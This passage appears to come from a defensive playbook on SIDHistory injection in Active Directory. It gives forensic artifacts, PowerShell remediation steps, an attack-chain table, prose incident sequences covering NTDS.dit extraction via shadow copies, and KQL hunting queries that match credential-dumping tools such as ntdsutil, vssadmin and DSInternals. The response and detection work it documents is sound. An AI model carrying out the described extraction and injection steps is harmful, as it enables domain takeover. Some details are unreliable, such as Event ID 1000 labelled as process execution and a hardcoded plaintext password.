### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\DirectoryService.evtx` (Event ID 5136)
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Event ID 4766, 4742, 4738)
- VSS shadow copy metadata
- NTDS.dit transaction logs

**Memory:**
- Kerberos tickets containing injected SIDs
- LSASS process memory (token structures with SID History)

**Cloud (Entra ID):**
- Sign-in logs showing unusual SID combinations in tokens
- Directory audit logs showing attribute modifications

### Response Procedures

1. **Isolate:**

   ```powershell
   # Disable affected user account
   Disable-ADAccount -Identity "normaluser"
   
   # Force logout of all sessions
   logoff /v:0  # On affected user's machine
   ```

2. **Collect Evidence:**

   ```powershell
   # Export affected user's directory service changes
   Get-WinEvent -LogName "Directory Service" -FilterXPath "*[EventData[Data[@Name='TargetUserName']='normaluser']]" | Export-Csv -Path C:\Evidence\User_Changes.csv
   
   # Export security events
   wevtutil epl Security C:\Evidence\Security.evtx
   ```

3. **Remediate:**

   ```powershell
   # Remove injected SIDHistory
   Set-ADUser -Identity "normaluser" -Clear sIDHistory
   
   # Reset user password
   Set-ADAccountPassword -Identity "normaluser" -NewPassword (ConvertTo-SecureString -AsPlainText -Force 'NewSecurePassword!')
   
   # Re-enable account after remediation
   Enable-ADAccount -Identity "normaluser"
   ```

4. **Hunt for Related Compromises:**

   ```powershell
   # Search for all users with suspicious SIDHistory during attack timeframe
   Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory, Modified | Where-Object {
       $_.Modified -ge [datetime]"2025-01-01" -and $_.Modified -le [datetime]"2025-01-10"
   }
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Phishing / [IA-EXPLOIT-001] App Proxy | Compromise initial account or Domain Controller |
| **2** | **Credential Access** | [CA-DUMP-006] NTDS.dit Extraction / [CA-DUMP-001] Mimikatz | Obtain Domain Admin credentials or NTDS.dit backup |
| **3** | **Privilege Escalation** | **[PE-TOKEN-004] SIDHistory Injection** | Inject high-privilege SID to shadow account |
| **4** | **Persistence** | SIDHistory as persistent backdoor | Account remains privileged across restarts/password changes |
| **5** | **Lateral Movement** | Cross-forest access via injected Enterprise Admin SID | Access resources in trusted forests |
| **6** | **Impact** | Full domain/forest compromise, ransomware, data exfiltration | Enterprise-wide compromise achieved |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: NTDS.dit Extraction & Offline SIDHistory Injection (2024)

- **Target:** Financial institution
- **Timeline:** March 2024
- **Technique Status:** Attacker obtained NTDS.dit via Volume Shadow Copy; injected offline using DSInternals
- **Impact:** Created "shadow admin" account; maintained access for 6 months undetected
- **Reference:** [SecFrame - SIDHistory Attack Marching onto a DC](https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/)

**Attack Sequence:**
1. Initial compromise via phishing (compromised employee credentials)
2. Created VSS shadow copy of DC drive
3. Extracted NTDS.dit from shadow copy
4. Offline: Injected Domain Admin SID into low-privilege "service" account using DSInternals
5. Restored modified NTDS.dit (required DC restart during maintenance)
6. Accessed domain resources using "shadow admin" account for 6 months
7. Discovered only when SIDHistory was audited as part of forensic investigation

---

### Example 2: Cross-Forest SIDHistory Enterprise Admin Escalation (2023)

- **Target:** Multi-forest enterprise environment
- **Timeline:** November 2023
- **Technique Status:** SIDHistory injection across forest boundary; SID filtering disabled on forest trust
- **Impact:** Escalated from child domain to forest root Enterprise Admin privileges
- **Reference:** [MITRE ATT&CK T1134.005 - Real-World Detections](https://attack.mitre.org/techniques/T1134/005/)

**Attack Sequence:**
1. Compromised child domain Domain Admin
2. Enumerated forest root's Enterprise Admins SID (RID 519)
3. Injected EA SID into child domain user
4. Exploited disabled SID filtering on forest trust (non-transitive trust misconfiguration)
5. Accessed forest root DC and compromised enterprise infrastructure

---

## 15. FORENSIC ANALYSIS & ADVANCED HUNTING

### Hunt for SIDHistory Injection (Sentinel KQL)

```kusto
SecurityEvent
| where EventID in (4766, 4742, 4738)
| where SidHistory matches regex @"S-1-5-\d+-512$|S-1-5-\d+-519$"  // DA/EA SIDs
| where TimeGenerated >= ago(30d)
| summarize Count = count(), LastSeen = max(TimeGenerated) by TargetUserName, SidHistory, SubjectUserName
| where Count >= 1  // Any DA/EA SID injection
```

### Hunt for Offline NTDS.dit Manipulation

```kusto
Event
| where EventID == 1000  // Process execution
| where CommandLine contains any ("ntdsutil", "vssadmin", "DSInternals", "ntds.dit")
| where Computer contains "DC"  // On domain controller
| project TimeGenerated, Computer, CommandLine, User
```

---